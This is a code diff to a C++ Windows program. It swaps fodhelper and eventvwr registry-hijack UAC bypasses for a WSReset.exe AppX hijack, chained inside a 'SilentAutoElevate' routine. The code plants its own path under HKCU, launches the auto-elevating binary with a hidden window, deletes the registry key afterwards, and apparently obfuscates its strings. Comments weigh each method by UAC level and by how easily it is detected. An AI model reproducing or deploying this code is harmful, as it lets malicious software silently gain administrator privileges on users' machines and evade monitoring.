@@ -149,67 +149,47 @@ static bool ElevateCmstplua(const char* me, const char* args) {
 	return SUCCEEDED(hr);
 }
 
-// ── fodhelper ms-settings COM hijack ─────────────────────────────────────────
-// fodhelper.exe is an auto-elevate binary (manifest: requestedExecutionLevel=requireAdministrator
-// + autoElevate=true). It looks up HKCU\Software\Classes\ms-settings\shell\open\command
-// before HKCR — so writing there takes precedence with no UAC prompt.
-// Works when UAC is NOT set to "Always notify" (default for most installs).
-// Detection: HKCU\Software\Classes\ms-settings registry write + fodhelper.exe launch.
+// ── WSReset.exe AppX store bypass ─────────────────────────────────────────────
+// WSReset.exe (Windows Store Reset) is an auto-elevate binary that reads
+// HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command
+// before HKCR — writing there causes it to launch our binary with highest privilege.
+// Uses the AppX registry surface, distinct from ms-settings/mscfile paths.
+// Works at Default UAC level or lower on Windows 10/11.
 
-static bool ElevateFodhelper(const char* me) {
-	const char* key  = S("Software\\Classes\\ms-settings\\shell\\open\\command").c_str();
+static bool ElevateWsreset(const char* me) {
+	std::string key = S("Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command");
 	HKEY hk = NULL;
-	if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
-	                    REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, NULL)
-	    != ERROR_SUCCESS) return false;
-	RegSetValueExA(hk, NULL,               0, REG_SZ, (LPBYTE)me,  (DWORD)strlen(me)+1);
-	RegSetValueExA(hk, S("DelegateExecute").c_str(), 0, REG_SZ, (LPBYTE)"", 1);
-	RegCloseKey(hk);
-	Sleep(50);
-	ShellExecuteA(NULL, S("open").c_str(), S("fodhelper.exe").c_str(), NULL, NULL, SW_HIDE);
-	Sleep(1800);
-	RegDeleteTreeA(HKEY_CURRENT_USER, S("Software\\Classes\\ms-settings").c_str());
-	return true;
-}
-
-// ── eventvwr mscfile COM hijack ───────────────────────────────────────────────
-// Same principle: eventvwr.exe (auto-elevate) reads HKCU\...\mscfile\shell\open\command.
-// Provides a second surface if fodhelper is patched or monitored.
-
-static bool ElevateEventvwr(const char* me) {
-	const char* key = S("Software\\Classes\\mscfile\\shell\\open\\command").c_str();
-	HKEY hk = NULL;
-	if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
+	if (RegCreateKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, NULL,
 	                    REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, NULL)
 	    != ERROR_SUCCESS) return false;
 	RegSetValueExA(hk, NULL, 0, REG_SZ, (LPBYTE)me, (DWORD)strlen(me)+1);
+	std::string delExec = S("DelegateExecute");
+	RegSetValueExA(hk, delExec.c_str(), 0, REG_SZ, (LPBYTE)"", 1);
 	RegCloseKey(hk);
 	Sleep(50);
-	ShellExecuteA(NULL, S("open").c_str(), S("eventvwr.exe").c_str(), NULL, NULL, SW_HIDE);
-	Sleep(1800);
-	RegDeleteTreeA(HKEY_CURRENT_USER, S("Software\\Classes\\mscfile").c_str());
+	std::string wsreset = S("WSReset.exe");
+	ShellExecuteA(NULL, S("open").c_str(), wsreset.c_str(), NULL, NULL, SW_HIDE);
+	Sleep(2500);
+	std::string base = S("Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2");
+	RegDeleteTreeA(HKEY_CURRENT_USER, base.c_str());
 	return true;
 }
 
 // ── Master silent elevation ───────────────────────────────────────────────────
-// Tries three escalation methods silently before falling back to the UAC dialog.
-// Method 1 (CMSTPLUA COM): works at all UAC levels except "Always notify".
-// Method 2 (fodhelper): works when UAC is Default or lower.
-// Method 3 (eventvwr): backup for when fodhelper is blocked.
-// Method 4 (runas): last resort — shows the standard UAC elevation dialog.
+// Tries two silent methods before falling back to the UAC dialog.
+// Method 1 (CMSTPLUA COM): no registry writes, works at all non-AlwaysNotify UAC levels.
+// Method 2 (WSReset AppX): AppX store registry surface, different from ms-settings/mscfile.
+// Method 3 (runas): last resort — shows the standard UAC elevation dialog.
 // If any method succeeds, the new elevated process runs this binary again and
 // this unelevated instance exits immediately.
 
 static void SilentAutoElevate(const char* me, const char* args) {
-	// Method 1: CMSTPLUA COM (completely silent)
+	// Method 1: CMSTPLUA COM (completely silent, no registry writes)
 	if (ElevateCmstplua(me, args)) return;
 	Sleep(200);
-	// Method 2: fodhelper (silent at default UAC)
-	if (ElevateFodhelper(me)) return;
-	Sleep(200);
-	// Method 3: eventvwr (silent at default UAC)
-	if (ElevateEventvwr(me)) return;
-	// Method 4: UAC dialog (last resort — shows one popup)
+	// Method 2: WSReset AppX bypass (silent at default UAC, different registry surface)
+	if (ElevateWsreset(me)) return;
+	// Method 3: UAC dialog (last resort — shows one popup)
 	SHELLEXECUTEINFOA sei = {};
 	sei.cbSize       = sizeof(sei);
 	sei.lpVerb       = S("runas").c_str();
